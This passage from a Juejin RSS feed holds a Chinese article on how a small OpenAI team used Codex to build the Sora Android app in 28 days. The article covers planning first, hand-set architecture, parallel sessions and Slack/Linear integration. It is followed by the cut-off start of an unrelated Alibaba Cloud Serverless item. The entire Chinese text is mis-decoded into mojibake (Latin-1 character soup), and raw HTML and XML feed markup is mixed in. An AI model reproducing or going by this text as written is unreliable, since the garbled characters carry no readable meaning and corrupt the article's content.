<li>**å“åº”åé¦ˆï¼š**åŒæ ·ï¼ŒCodex å¾ˆå¬åŠã€‚å½“ CI æŒ‚äº†çš„æ—¶å€™ï¼Œå¯ä»¥ç›´æ¥æŠŠæ—¥å¿—ç”©ç»™å®ƒï¼ˆç²˜è´´åˆ° prompt é‡Œï¼‰ï¼Œè®©å®ƒç»™ä¸ªä¿®å¤æ–¹æ¡ˆã€‚</li>
<li>**å¤§è§„æ¨¡å¹¶è¡Œã€ç”¨å®Œå³å¼ƒï¼š**å¤§å¤šæ•°äººæ ¹æœ¬æ²¡è¯•æ¢è¿‡å¹¶è¡Œä¼šè¯æ•°é‡çš„æé™ã€‚å¼€å‘è€…å¯ä»¥å¹¶è¡Œæµ‹è¯•å¥½å‡ ä¸ªæƒ³æ³•ï¼ŒæŠŠä»£ç å½“æˆä¸€æ¬¡æ€§ç”¨å“ï¼Œä¸è¡Œå°±æ‰”ã€‚</li>
<li>**æä¾›æ–°è§†è§’ï¼š**åœ¨è®¾è®¡è®¨è®ºä¸­ï¼Œå›¢é˜Ÿä¼šæŠŠ Codex å½“æˆä¸€ä¸ªç”Ÿæˆå¼å·¥å…·ï¼Œç”¨å®ƒæ¥æŒ–æ˜æ½œåœ¨çš„æ•…éšœç‚¹ï¼Œæˆ–è€…å‘ç°è§£å†³é—®é¢˜çš„æ–°è·¯å­ã€‚æ¯”å¦‚ï¼Œåœ¨è®¾è®¡è§†é¢‘æ’­æ”¾å™¨å†…å­˜ä¼˜åŒ–æ—¶ï¼ŒCodex ç¿»éäº†å¤šä¸ª SDKï¼Œæå‡ºäº†ä¸€äº›å›¢é˜Ÿæ ¹æœ¬æ²¡æ—¶é—´å»ç»†ç©¶çš„æ–¹æ¡ˆã€‚Codex è°ƒç ”å‡ºçš„è¿™äº›è§è§£ï¼Œå¯¹äºå°†æœ€ç»ˆ App å†…å­˜å ç”¨é™åˆ°æœ€ä½ç®€ç›´ä»·å€¼è¿åŸã€‚</li>
<li>**è…¾å‡ºæ‰‹åšé«˜æ æ†å·¥ä½œï¼š**å®é™…ä¸Šï¼Œå›¢é˜Ÿæœ€åèŠ±åœ¨ Review å’ŒæŒ‡æŒ¥ä»£ç ä¸Šçš„æ—¶é—´ï¼Œæ¯”è‡ªå·±å†™çš„æ—¶é—´è¿˜è¦å¤šã€‚è¯è™½å¦‚æ­¤ï¼ŒCodex åœ¨ä»£ç å®¡æŸ¥ï¼ˆCode Reviewï¼‰æ–¹é¢ä¹Ÿå¾ˆç‰›ï¼Œç»å¸¸èƒ½åœ¨åˆå¹¶ä»£ç å‰å°±æªå‡º Bugï¼Œæé«˜äº†å¯é æ€§ã€‚</li>
</ul>
<p>ä¸€æ—¦æ‘¸æ¸…äº† Codex çš„èƒ½åŠ›ï¼Œå›¢é˜Ÿçš„å·¥ä½œæ¨¡å¼å°±å˜å¾—å¾ˆç›´æ¥äº†ã€‚</p>
<p>åœ¨æ¨¡å¼æ¸…æ™°ã€èŒƒå›´æ˜ç¡®çš„åœ°æ–¹ï¼Œè®© Codex å»å¹²é‚£äº›ç¹é‡çš„è‹¦åŠ›æ´»ï¼›è€Œå›¢é˜Ÿåˆ™ä¸“æ³¨äºæ¶æ„ã€ç”¨æˆ·ä½“éªŒã€ç³»ç»Ÿæ€§å˜æ›´å’ŒæŠŠæ§æœ€ç»ˆè´¨é‡ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dddfba4b2a50498ba1e4558ffa99676b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766398910&amp;x-signature=wPihruX7Xio0I%2F7mULaXYRtzWYM%3D" alt="" loading="lazy"/></p>
<p><strong>ã€Œç«‹è§„çŸ©ï¼Œæ‰‹åŠ¨æ‰“åœ°åŸºã€</strong></p>
<p>ä¸ºäº†ç”¨å¥½ Codex å¹¶ç¡®ä¿å‡ºæ´»ç¨³å¥ã€å¥½ç»´æŠ¤ï¼Œå…³é”®åœ¨äºï¼Œå¼€å‘è€…è¦äº²è‡ªæŠŠæ§ç³»ç»Ÿçš„è®¾è®¡å’Œå…³é”®æƒè¡¡ã€‚</p>
<p>è¿™åŒ…æ‹¬å®šå¥½ App çš„æ¶æ„ã€æ¨¡å—åŒ–ã€ä¾èµ–æ³¨å…¥å’Œå¯¼èˆªï¼›ç”šè‡³èº«ä»½éªŒè¯å’ŒåŸºç¡€ç½‘ç»œæµç¨‹ä¹Ÿæ˜¯è‡ªå·±æå®šçš„ã€‚</p>
<p>å¯¹äºä¸€ä¸ªä¼°ç®—æœ‰ 85% çš„ä»£ç éƒ½æ˜¯ Codex å†™çš„é¡¹ç›®æ¥è¯´ï¼Œä¸€ä¸ªç²¾å¿ƒè§„åˆ’çš„åœ°åŸºé¿å…äº†æ˜‚è´µçš„è¿”å·¥å’Œé‡æ„ã€‚</p>
<p>OpenAI å›¢é˜Ÿè¡¨ç¤ºï¼Œã€Œè¿™ç»å¯¹æ˜¯æˆ‘ä»¬åšè¿‡çš„æœ€æ­£ç¡®çš„å†³å®šä¹‹ä¸€ã€ã€‚</p>
<p>ä¸€å®šè¦å½¢æˆè¿™æ ·ä¸€ä¸ªæ€è·¯â€”â€”</p>
<p>ä¸æ˜¯ä¸ºäº†å°½å¿«æä¸ªã€Œèƒ½è·‘çš„ä¸œè¥¿ã€ï¼Œè€Œæ˜¯è¦æä¸ªã€Œæ‡‚è§„çŸ©çš„ä¸œè¥¿ã€ã€‚</p>
<p>å†™ä»£ç æœ‰å¾ˆå¤šç§ã€Œæ­£ç¡®ã€çš„æ–¹å¼ï¼š</p>
<ul>
<li>ä¸éœ€è¦å‘Šè¯‰ Codex å…·ä½“æ¯ä¸€æ­¥æ€ä¹ˆåšï¼›</li>
<li>ä½†éœ€è¦å‘ Codex å±•ç¤ºä»€ä¹ˆæ˜¯ã€Œæ­£ç¡®ã€çš„ã€‚</li>
</ul>
<p>ä¸€æ—¦å®šå¥½äº†èµ·ç‚¹å’Œå›¢é˜Ÿå–œæ¬¢çš„æ„å»ºæ–¹å¼ï¼ŒCodex å°±å¯ä»¥å¼€å·¥äº†ã€‚</p>
<p>ä¸ºäº†çœ‹çœ‹ä¼šå‘ç”Ÿä»€ä¹ˆï¼ŒOpenAI å›¢é˜Ÿç¡®å®è¯•è¿‡ç›´æ¥ç»™ Promptï¼š</p>
<p>ç…§ç€ iOS ä»£ç æ„å»º Sora Android Appã€‚å¼€å§‹å¹²ã€‚</p>
<p>ç»“æœï¼Œå¾ˆå¿«å°±ç¿»è½¦äº†ã€‚</p>
<p>è™½ç„¶ Codex å†™å‡ºæ¥çš„ä¸œè¥¿æŠ€æœ¯ä¸Šèƒ½è·‘ï¼Œä½†äº§å“ä½“éªŒå®Œå…¨ä¸è¾¾æ ‡ã€‚</p>
<p>è€Œä¸”å¦‚æœä¸æ‡‚ç«¯ç‚¹ã€æ•°æ®å’Œç”¨æˆ·æµï¼ŒCodex è¿™ç§ã€Œä¸€é”¤å­ä¹°å–ã€ï¼ˆZero-shotï¼‰å†™å‡ºæ¥çš„ä»£ç æ ¹æœ¬ä¸å¯é ã€‚å“ªæ€•ä¸ç”¨ AIï¼Œä¸€æ¬¡æ€§åˆå¹¶å‡ åƒè¡Œä»£ç ä¹Ÿæ˜¯ä½œæ­»ã€‚</p>
<p>OpenAI çš„å‡è®¾æ˜¯ï¼Œå¦‚æœç»™ Codex ä¸€ä¸ªå†™æ»¡å¥½èŒƒä¾‹çš„æ²™ç›’ï¼Œå®ƒå°±èƒ½å¦‚é±¼å¾—æ°´ï¼›äº‹å®è¯æ˜ï¼Œä»–ä»¬æ˜¯å¯¹çš„ã€‚</p>
<p>å…‰ç§ƒç§ƒåœ°è®© Codexã€Œåšä¸ªè®¾ç½®é¡µé¢ã€åŸºæœ¬ä¸é è°±ã€‚</p>
<p>ä½†å¦‚æœä½ è®©å®ƒã€Œå‚è€ƒä½ åˆšæ‰çœ‹åˆ°çš„é‚£ä¸ªé¡µé¢çš„æ¶æ„å’Œæ¨¡å¼ï¼Œåšä¸ªè®¾ç½®é¡µé¢ã€ï¼Œæ•ˆæœå°±å¥½å¤ªå¤šäº†ã€‚</p>
<p>äººç±»åšç»“æ„æ€§çš„å†³ç­–å¹¶å®šä¸‹ç¡¬æ€§è§„çŸ©ï¼›Codex è´Ÿè´£åœ¨è¿™ä¸ªæ¡†æ¶é‡Œå¡«å……å¤§é‡çš„ä»£ç ã€‚</p>
<p><strong>ã€Œ<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7012d39e6238429ca076a39ff4a2a0c2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766398910&amp;x-signature=HHuquk3QaG%2FX0zAVHvVQFZI8J3Q%3D" alt="" loading="lazy"/>ã€</strong></p>
<p><strong>ã€Œå…ˆè§„åˆ’ï¼Œå†ç¼–ç ã€</strong></p>
<p>ä¸ºäº†æœ€å¤§åŒ– Codex çš„æ½œåŠ›ï¼Œå›¢é˜Ÿä¸‹ä¸€æ­¥æ˜¯ææ¸…æ¥šâ€”â€”æ€ä¹ˆè®© Codex é•¿æ—¶é—´åœ¨æ— äººç›‘ç£çš„çŠ¶æ€ä¸‹å¹²æ´»ã€‚</p>
<p>ä¸ºæ­¤ï¼Œ4 äººå›¢é˜Ÿæ”¹äº†å·¥ä½œæµã€‚</p>
<p>å¯¹äºä»»ä½•ç¨å¾®å¤æ‚ç‚¹çš„æ”¹åŠ¨ï¼Œå…ˆè®© Codex å¸®ç†æ¸…ç³»ç»Ÿå’Œä»£ç æ˜¯æ€ä¹ˆè¿ä½œçš„ã€‚</p>
<p>æ¯”å¦‚ï¼Œè®©å®ƒè¯»ä¸€ç»„ç›¸å…³æ–‡ä»¶ï¼Œæ€»ç»“è¿™ä¸ªåŠŸèƒ½æ˜¯æ€ä¹ˆè·‘çš„ï¼›æ¯”å¦‚æ•°æ®æ€ä¹ˆä» API æµç» Repository å±‚ã€ViewModelï¼Œæœ€ååˆ° UIï¼Œç„¶åäººå·¥çº æ­£æˆ–ç»†åŒ–å®ƒçš„ç†è§£ã€‚</p>
<p>è¿™å°±åƒå¸¦ä¸€ä¸ªèƒ½åŠ›å¾ˆå¼ºçš„æ–°é˜Ÿå‹ä¸€æ ·ï¼Œå›¢é˜Ÿä¼šè·Ÿ Codex ä¸€èµ·åˆ¶å®šä¸€ä¸ªæ‰å®çš„å®æ–½è®¡åˆ’ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0b618bb7f6444f98bad1ebf677769598~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766398910&amp;x-signature=FPbMKh0wGhKG8qfpcntmuu%2FGPpY%3D" alt="" loading="lazy"/></p>
<p>è¿™ä¸ªè®¡åˆ’é€šå¸¸åƒä¸€ä»½å¾®å‹è®¾è®¡æ–‡æ¡£ï¼ŒæŒ‡æ˜å“ªäº›æ–‡ä»¶è¦æ”¹ï¼Œè¦å¼•å…¥ä»€ä¹ˆæ–°çŠ¶æ€ï¼Œé€»è¾‘è¯¥æ€ä¹ˆèµ°ã€‚</p>
<p>åªæœ‰åˆ°äº†è¿™ä¸€æ­¥ï¼Œå›¢é˜Ÿæ‰è®© Codex å¼€å§‹æ‰§è¡Œè®¡åˆ’ï¼Œä¸€æ­¥æ­¥æ¥ã€‚</p>
<p>æ­¤å¤„ï¼Œæœ‰ä¸ªéå¸¸å®ç”¨çš„å°æŠ€å·§ï¼š</p>
<p>å¯¹äºé‚£ç§è¶…é•¿ä»»åŠ¡ï¼Œå½“ä¸Šä¸‹æ–‡çª—å£å¿«çˆ†äº†çš„æ—¶å€™ï¼Œä»–ä»¬ä¼šè®© Codex æŠŠè®¡åˆ’ä¿å­˜åˆ°ä¸€ä¸ªæ–‡ä»¶é‡Œï¼Œè¿™æ ·å°±èƒ½åœ¨ä¸åŒçš„ä¼šè¯é‡Œå»¶ç»­åŒæ ·çš„æŒ‡å¯¼æ€è·¯ã€‚</p>
<p>è¿™ä¸ªé¢å¤–çš„è§„åˆ’å¾ªç¯è¯æ˜ï¼Œç£¨åˆ€ä¸è¯¯ç æŸ´å·¥ã€‚</p>
<p>å›¢é˜Ÿå¯ä»¥æ”¾å¿ƒåœ°è®© Codex é•¿æ—¶é—´ã€Œæ— äººç›‘ç£ã€åœ°è·‘ï¼Œè¿™ä¹Ÿè®© Code Review å˜å¾—æ›´å®¹æ˜“ï¼Œå› ä¸ºå¯ä»¥å¯¹ç…§è®¡åˆ’æ¥æ£€æŸ¥å®ç°ï¼Œè€Œä¸æ˜¯ä¸€è„¸æ‡µé€¼åœ°çœ‹ Diffã€‚</p>
<p>è€Œä¸”ä¸‡ä¸€å‡ºé—®é¢˜äº†ï¼Œå¯ä»¥å…ˆè°ƒè¯•è®¡åˆ’ï¼Œå†è°ƒè¯•ä»£ç ã€‚</p>
<p><strong>ã€Œ<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/71ad75b395184da1a5edd77fafb3d221~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766398910&amp;x-signature=OM4Uy9x9INOZwIq2RUVEPbd2nkE%3D" alt="" loading="lazy"/>ã€</strong></p>
<p><strong>ã€Œå¤š AI å¹¶è¡Œï¼Œ åˆ†å¸ƒå¼å·¥ç¨‹ã€</strong></p>
<p>åœ¨é¡¹ç›®æœ€å¿™çš„æ—¶å€™ï¼ŒOpenAI å›¢é˜Ÿç»å¸¸å¹¶è¡Œè·‘ç€å¥½å‡ ä¸ª Codex ä¼šè¯ã€‚</p>
<p>ä¸€ä¸ªåœ¨åšæ’­æ”¾åŠŸèƒ½ï¼Œå¦ä¸€ä¸ªåœ¨åšæœç´¢ï¼Œå¦ä¸€ä¸ªåœ¨å¤„ç†é”™è¯¯ï¼Œæœ‰æ—¶å€™è¿˜æœ‰ä¸€ä¸ªåœ¨å†™æµ‹è¯•æˆ–é‡æ„ã€‚</p>
<p>è¿™æ„Ÿè§‰ä¸åƒæ˜¯ç”¨å·¥å…·ï¼Œæ›´åƒæ˜¯ã€Œç®¡å›¢é˜Ÿã€ã€‚æ¯ä¸ªä¼šè¯éƒ½ä¼šå®šæœŸæ±‡æŠ¥è¿›åº¦ã€‚</p>
<p>ä¸€ä¸ªå¯èƒ½ä¼šè¯´ï¼Œã€Œæˆ‘å·²ç»è§„åˆ’å¥½è¿™ä¸ªæ¨¡å—äº†ï¼›è¿™æ˜¯æˆ‘çš„å»ºè®®ã€ï¼Œè€Œå¦ä¸€ä¸ªä¼šä¸ºä¸€ä¸ªæ–°åŠŸèƒ½ç”©å‡ºä¸€ä¸ªå·¨å¤§çš„ Diffã€‚</p>
<p>æ¯ä¸€ä¸ªéƒ½éœ€è¦å…³æ³¨ã€åé¦ˆå’Œ Reviewã€‚</p>
<p>è¿™è·Ÿåšä¸€ä¸ªå¸¦ç€å¥½å‡ ä¸ªæ–°äººçš„ Tech Lead ç®€ç›´ä¸€æ¨¡ä¸€æ ·ï¼Œå¤§å®¶éƒ½åœ¨æ¨è¿›ï¼Œå¤§å®¶éƒ½éœ€è¦æŒ‡å¯¼ã€‚</p>
<p>ç»“æœå°±æ˜¯å½¢æˆäº†ä¸€ç§åä½œæµã€‚Codex è¿™ç§æš´åŠ›çš„ç¼–ç èƒ½åŠ›ï¼ŒæŠŠå›¢é˜Ÿä»å¤§é‡çš„æ‰‹å·¥æ‰“å­—ä¸­è§£æ”¾å‡ºæ¥äº†ã€‚</p>
<p>å› æ­¤ï¼Œä»–ä»¬æœ‰æ›´å¤šçš„æ—¶é—´æ€è€ƒæ¶æ„ï¼Œä»”ç»†è¯» PRï¼Œæµ‹è¯• Appã€‚</p>
<p>Codex ä¸ä¼šæœ‰ä¸Šä¸‹æ–‡åˆ‡æ¢çš„ç“¶é¢ˆï¼Œä½†å¼€å‘è€…æœ‰ã€‚å¼€å‘å·¥ä½œæµï¼Œä»å†™ä»£ç å˜æˆäº†åšå†³å®šã€ç»™åé¦ˆå’Œé›†æˆå˜æ›´ã€‚</p>
<p>è¿™å°±æ˜¯ã€Œå¸ƒé²å…‹æ–¯çš„å®šå¾‹ã€ä»¥ä¸€ç§æ–°æ–¹å¼åº”éªŒçš„åœ°æ–¹ã€‚</p>
<p>ä½ ä¸èƒ½ç®€å•åœ°å¢åŠ  Codex ä¼šè¯å°±æŒ‡æœ›é€Ÿåº¦çº¿æ€§æå‡ï¼Œå°±åƒä½ ä¸èƒ½å¾€é¡¹ç›®é‡Œæ— é™åŠ äººä¸€æ ·ã€‚</p>
<p>æ¯ä¸€åŒé¢å¤–çš„ã€Œæ‰‹ã€ï¼Œå“ªæ€•æ˜¯è™šæ‹Ÿçš„ï¼Œéƒ½ä¼šå¢åŠ åè°ƒæˆæœ¬ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d9468dfa897b436c82d3047b6c2088e1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766398910&amp;x-signature=BzYJXOGAVqNJ%2BUI922EGdBU2%2Bpo%3D" alt="" loading="lazy"/></p>
<p><strong>ã€ŒCodexï¼šè·¨å¹³å°è¶…èƒ½åŠ›ã€</strong></p>
<p>OpenAI è¿™ä¸€é¡¹ç›®èµ·æ­¥æ—¶æœ‰ä¸€ä¸ªå·¨å¤§çš„å…ˆå‘ä¼˜åŠ¿ï¼šSora å·²ç»åœ¨ iOS ä¸Šå‘å¸ƒäº†ã€‚</p>
<p>ä»–ä»¬ç»å¸¸æŠŠ Codex æŒ‡å‘ iOS å’Œåç«¯ä»£ç åº“ï¼Œå¸®å®ƒç†è§£å…³é”®éœ€æ±‚å’Œçº¦æŸã€‚</p>
<p>åœ¨æ•´ä¸ªé¡¹ç›®è¿‡ç¨‹ä¸­ï¼ŒOpenAI å¼€ç©ç¬‘è¯´ã€Œé‡æ–°å‘æ˜äº†è·¨å¹³å°æ¡†æ¶ï¼Œå¿˜æ‰ React Native æˆ– Flutterï¼Œè·¨å¹³å°çš„æœªæ¥å°±æ˜¯ Codexã€ã€‚</p>
<p>è¿™å¥ç©ç¬‘èƒŒåæœ‰ä¸¤ä¸ªåŸåˆ™ï¼š</p>
<p><strong>ã€Œ1. é€»è¾‘æ˜¯å¯ç§»æ¤çš„ã€</strong></p>
<p>æ— è®ºä»£ç æ˜¯ç”¨ Swift è¿˜æ˜¯ Kotlin å†™çš„ï¼Œåº•å±‚çš„åº”ç”¨é€»è¾‘â€”â€”æ•°æ®æ¨¡å‹ã€ç½‘ç»œè°ƒç”¨ã€éªŒè¯è§„åˆ™ã€ä¸šåŠ¡é€»è¾‘â€”â€”éƒ½æ˜¯ä¸€æ ·çš„ã€‚Codex éå¸¸æ“…é•¿è¯»å– Swift å®ç°å¹¶ç”Ÿæˆè¯­ä¹‰ä¸€è‡´çš„ Kotlin ä»£ç ã€‚</p>
<p><strong>ã€Œ2. å…·ä½“ç¤ºä¾‹æä¾›å¼ºå¤§çš„ä¸Šä¸‹æ–‡ã€</strong></p>
<p>ä¸€ä¸ªå…¨æ–°çš„ Codex ä¼šè¯ï¼Œå¦‚æœèƒ½çœ‹åˆ°ã€Œè¿™å°±æ˜¯å®ƒåœ¨ iOS ä¸Šç©¶ç«Ÿæ˜¯æ€ä¹ˆè·‘çš„ã€ä»¥åŠã€Œè¿™æ˜¯ Android çš„æ¶æ„ã€ï¼Œé‚£æ•ˆç‡è¿œæ¯”å…‰å¬è‡ªç„¶è¯­è¨€æè¿°è¦é«˜å¾—å¤šã€‚</p>
<p>åŸºäºè¿™äº›åŸåˆ™ï¼Œå›¢é˜ŸæŠŠ iOSã€åç«¯å’Œ Android ä»“åº“éƒ½æ”¾åˆ°äº†åŒä¸€ä¸ªç¯å¢ƒä¸­ã€‚</p>
<p>ç»™ Codex ä¸€ä¸ªè¿™æ ·çš„ Promptï¼š</p>
<p>é˜…è¯» iOS ä»£ç é‡Œçš„è¿™äº›æ¨¡å‹å’Œç«¯ç‚¹ï¼Œç„¶åå‡ºä¸€ä¸ªè®¡åˆ’ï¼Œç”¨ç°æœ‰çš„ API Client å’Œæ¨¡å‹ç±»åœ¨ Android ä¸Šå®ç°åŒæ ·çš„è¡Œä¸ºã€‚</p>
<p>æ­¤å¤„ï¼Œä¹Ÿæœ‰ä¸€ä¸ªå®ç”¨çš„å°æŠ€å·§ï¼š</p>
<p>åœ¨~/.codex/AGENTS.md é‡Œè¯¦ç»†å†™æ˜æœ¬åœ°ä»“åº“åœ¨å“ªå„¿ä»¥åŠé‡Œé¢æœ‰å•¥ã€‚è¿™èƒ½è®© Codex æ›´å®¹æ˜“åœ°æ‰¾åˆ°å’Œè·³è½¬åˆ°ç›¸å…³ä»£ç ã€‚</p>
<p>æ›´å¹¿æ³›çš„ç»éªŒæ˜¯ï¼Œå¯¹äº Codex æ¥è¯´ï¼Œä¸Šä¸‹æ–‡å°±æ˜¯ä¸€åˆ‡ã€‚</p>
<p>å½“ Codex ç†è§£äº†åŠŸèƒ½åœ¨ iOS é‡Œæ˜¯æ€ä¹ˆè·‘çš„ï¼Œå†ç»“åˆå¯¹ Android App ç»“æ„çš„ç†è§£ï¼Œå°±èƒ½è·å¾—éå¸¸å¥½çš„ç»“æœã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ca2ef7cba22b48ab9dcf6d42fd6991f7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766398910&amp;x-signature=kDa%2BiV32UOgKoimqQr4GylSSnlw%3D" alt="" loading="lazy"/></p>
<p><strong>ã€Œä¸€åœºå¤ç›˜ ï¼Œå¼€å‘è€…ã€Œè¶…èƒ½åŠ›ã€è§‰é†’ã€</strong></p>
<p>28 å¤©å†²åˆºç»“æŸæ—¶ï¼Œç”¨ Codex å·²æˆä¸º OpenAI é»˜è®¤çš„å¼€å‘é—­ç¯â€”â€”ç†è§£ä»£ç ã€è§„åˆ’å˜æ›´ã€å®ç°åŠŸèƒ½ã€Review è¾“å‡ºã€‚</p>
<p>æ˜¾ç„¶ï¼ŒAI è¾…åŠ©å¼€å‘å¹¶æ²¡æœ‰é™ä½å·¥ç¨‹çš„ä¸¥è°¨æ€§ï¼Œåè€Œæå‡äº†å®ƒã€‚</p>
<p>Codex å›¢é˜Ÿè®¾è®¡å¸ˆ Ed Bayes æè¿°äº†ï¼Œè¿™ä¸ªå·¥å…·å¦‚ä½•æ”¹å˜äº†è‡ªå·±çš„å·¥ä½œæµã€‚</p>
<p>å¦‚ä»Šï¼ŒCodex å·²ä¸é¡¹ç›®ç®¡ç†å·¥å…· Linearã€ä»¥åŠé€šè®¯å¹³å° Slack æ‰“é€šï¼Œå›¢é˜Ÿæˆå‘˜å¯ä»¥ç›´æ¥æŠŠç¼–ç¨‹ä»»åŠ¡æ´¾ç»™ AI æ™ºèƒ½ä½“ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e2390f6f937248e4b23d38d45ae18133~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766398910&amp;x-signature=Ekb8rrpvtZn0mkhIS%2FHI25Zp4zQ%3D" alt="" loading="lazy"/></p>
<p>ä»–è¡¨ç¤ºï¼Œã€Œä½ å¯ä»¥æŠŠ Codex æ‹‰è¿›æ¥ï¼ŒåŸºæœ¬ä¸Šå¯ä»¥ç›´æ¥ç»™ Codex æŒ‡æ´¾ issueã€‚Codex ç®€ç›´å°±æ˜¯ä½ å·¥ä½œåŒºé‡Œçš„ä¸€ä¸ªé˜Ÿå‹ã€ã€‚</p>
<p>è¿™ç§é›†æˆæ„å‘³ç€ï¼Œå½“æœ‰äººåœ¨ Slack é‡Œå‘åé¦ˆæ—¶ï¼Œå¯ä»¥ç›´æ¥ @Codex è®©å®ƒä¿® bugï¼›å®ƒè¿˜ä¼šæä¸€ä¸ª PRï¼Œå›¢é˜Ÿæˆå‘˜å¯ä»¥åœ¨åŒä¸€ä¸ªå¸–å­é‡Œå®¡æŸ¥ä»£ç å¹¶è¿›è¡Œè¿­ä»£ã€‚</p>
<p>ã€Œå®ƒåŸºæœ¬ä¸Šå°±æ˜¯åœ¨æ¨¡æ‹Ÿè¿™ç§åŒäº‹å…³ç³»ï¼Œä¸ç®¡ä½ åœ¨å“ªå·¥ä½œå®ƒéƒ½åœ¨ã€ã€‚</p>
<p>å°½ç®¡ Codex èƒ½åŠ›å¾ˆå¼ºï¼Œä½†å®ƒçš„ç›®æ ‡æ˜¯ç«‹åˆ»ä» A åˆ° Bã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆç¦»äº†äººï¼ŒAI è¾…åŠ©ç¼–ç¨‹å°±ç©ä¸è½¬ã€‚</p>
<p>æ˜æ—¥è½¯ä»¶å·¥ç¨‹å¸ˆçš„ã€Œè¶…èƒ½åŠ›ã€ï¼Œå°†æ˜¯æ·±åˆ»çš„ç³»ç»Ÿç†è§£èƒ½åŠ›ï¼Œä»¥åŠåœ¨é•¿æ—¶é—´è·¨åº¦ä¸Šä¸ AI åä½œçš„èƒ½åŠ›ã€‚</p>
<p>ç°åœ¨ï¼ŒCodex è®©å¼€å‘è€…èƒ½ä¸“æ³¨äºè½¯ä»¶å·¥ç¨‹æœ€æœ‰æ„ä¹‰çš„éƒ¨åˆ†ï¼Œå›å½’ä»–ä»¬çƒ­çˆ±è¿™é—¨æ‰‹è‰ºçš„åˆå¿ƒã€‚</p>
<p>ä¸€æ—¦ Codex åœ¨ä¸€ä¸ªä¸Šä¸‹æ–‡ä¸°å¯Œçš„ç¯å¢ƒä¸­é…ç½®å¥½ï¼Œæ‡‚ä½ çš„ç›®æ ‡å’Œä½ å–œæ¬¢çš„æ„å»ºæ–¹å¼ï¼Œä»»ä½•å›¢é˜Ÿéƒ½èƒ½è®©æˆ˜æ–—åŠ›ç¿»å€ã€‚</p>
<p>è¿™ä¸€æ¬¡ï¼ŒOpenAI çš„å‘å¸ƒå¤ç›˜ä¸æ˜¯ä¸€ä¸ªä¸‡èƒ½è¯æ–¹ï¼Œä¹Ÿä¸æ•¢è¯´å·²ç»å½»åº•ææ‡‚äº† AI è¾…åŠ©å¼€å‘ã€‚</p>
<p>ä½†ä»–ä»¬å¸Œæœ›ï¼Œèƒ½ä»¥è‡ªå·±çš„ç»éªŒå¯å‘æ›´å¤šçš„å¼€å‘è€…ï¼Œè®© Codex æ›´å¥½åœ°ä¸ºäººä»¬æ‰€ç”¨ã€‚</p>
<p>å‚è€ƒèµ„æ–™ï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Farstechnica.com%2Fai%2F2025%2F12%2Fhow-openai-is-using-gpt-5-codex-to-improve-the-ai-tool-itself%2F" target="_blank" title="https://arstechnica.com/ai/2025/12/how-openai-is-using-gpt-5-codex-to-improve-the-ai-tool-itself/" ref="nofollow noopener noreferrer">arstechnica.com/ai/2025/12/â€¦</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fopenai.com%2Findex%2Fshipping-sora-for-android-with-codex%2F" target="_blank" title="https://openai.com/index/shipping-sora-for-android-with-codex/" ref="nofollow noopener noreferrer">openai.com/index/shippâ€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[é˜¿é‡Œäº‘ Serverless è®¡ç®— 11 æœˆäº§å“åŠ¨æ€]]></title>    <link>https://juejin.cn/post/7583906478328135699</link>    <guid>https://juejin.cn/post/7583906478328135699</guid>    <pubDate>2025-12-15T10:26:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583906478328135699" data-draft-id="7583906478328119315" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="é˜¿é‡Œäº‘ Serverless è®¡ç®— 11 æœˆäº§å“åŠ¨æ€"/> <meta itemprop="keywords" content="Serverless"/> <meta itemprop="datePublished" content="2025-12-15T10:26:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿é‡Œäº‘äº‘åŸç”Ÿ"/> <meta itemprop="url" content="https://juejin.cn/user/3808363977648493"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta 